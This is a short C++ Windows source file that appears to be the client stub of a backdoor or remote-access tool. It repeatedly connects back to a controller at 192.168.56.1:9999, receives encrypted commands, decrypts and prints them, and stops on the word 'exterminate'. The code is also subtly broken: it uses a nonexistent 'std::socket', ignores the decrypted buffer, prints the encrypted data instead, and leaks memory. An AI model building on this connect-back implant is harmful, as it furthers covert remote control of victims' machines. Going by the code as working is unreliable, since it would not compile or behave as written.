#include "mode.h"

// standard libraries
#include <string>
#include <cstring>


// own libraries
#include "socket.h"
#include "assets.h"

// debugging libraries
#ifdef DEBUG_MODE
#include <iostream>

#endif


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	std::socket s(AF_INET, SOCK_STREAM);

	while(true) {
		while(s.connect("192.168.56.1", "9999") == -1) {
			#ifdef DEBUG_MODE
				raw_out("connecting ...");
			#endif
			Sleep(1 * 1000);
		}

		while(true) {
			char *data = new char[asset::BUFF_SIZE];
			memset(data, 0, asset::BUFF_SIZE);
			s.recv(data, asset::BUFF_SIZE);


			char *decrypted = asset::_cipher(data, asset::decrypt);
			// TODO: recv more than 16 bytes of encrypted data
			
			raw_out(data);
			if(strcmp(data, "exterminate") == 0) break;

			delete [] data;
		}
	}

	return 0;
}
